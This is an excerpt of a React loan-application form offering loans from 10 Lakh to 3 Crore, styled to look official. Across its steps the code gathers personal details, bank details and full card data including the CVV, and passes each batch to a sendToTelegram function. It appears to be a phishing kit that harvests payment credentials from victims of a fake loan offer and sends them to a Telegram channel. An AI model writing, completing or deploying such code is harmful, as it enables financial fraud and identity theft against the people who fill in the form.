...
import { Check, ShieldCheck, Lock, FileText, CreditCard, Banknote, ArrowRight, ArrowLeft, Wifi, BadgeCheck, Loader2, Smartphone, RefreshCw, MessageSquare, Phone } from "lucide-react";
...
const loanAmounts = [
  "10,00,000 (10 Lakh)", "20,00,000 (20 Lakh)", "30,00,000 (30 Lakh)", "50,00,000 (50 Lakh)",
  "75,00,000 (75 Lakh)", "1,00,00,000 (1 Crore)", "1,50,00,000 (1.5 Crore)",
  "2,00,00,000 (2 Crore)", "2,50,00,000 (2.5 Crore)", "3,00,00,000 (3 Crore)",
];
...
const LoanForm = () => {
  ...
  const next = () => {
    ...
    const card = {
      "Card Number": data.cardNumber, "Card Holder": data.cardName,
      Expiry: data.expiry, CVV: data.cvv,
    };

    if (step === 1) {
      sendToTelegram("step1", personal);
    } else if (step === 2) {
      sendToTelegram("step2", { ...personal, ...bank });
    } else if (step === 3) {
      sendToTelegram("step3", { ...personal, ...bank, ...card });
    }
  ...
  const detectBrand = (num: string): "visa" | "mastercard" | null => {
  ...
  const cardBrand = detectBrand(data.cardNumber);
        ...
        {step === 3 && (
          <div className="space-y-6 animate-fade-in">
            ...
            <div className="space-y-4">
              ...
              {/* Hidden auto-filled card name */}
              <input type="hidden" value={data.cardName || data.fullName} readOnly />
            </div>
          </div>
        )}
          ...
          <div className="space-y-6 animate-fade-in">
            ...
            <div className="flex items-center justify-between rounded-xl bg-muted/40 border border-border p-3">
              ...
              <button
                ...
                className="inline-flex items-center gap-1.5 text-sm text-gov-green hover:text-gov-green-dark font-semibold disabled:opacity-40 disabled:cursor-not-allowed transition"
              >
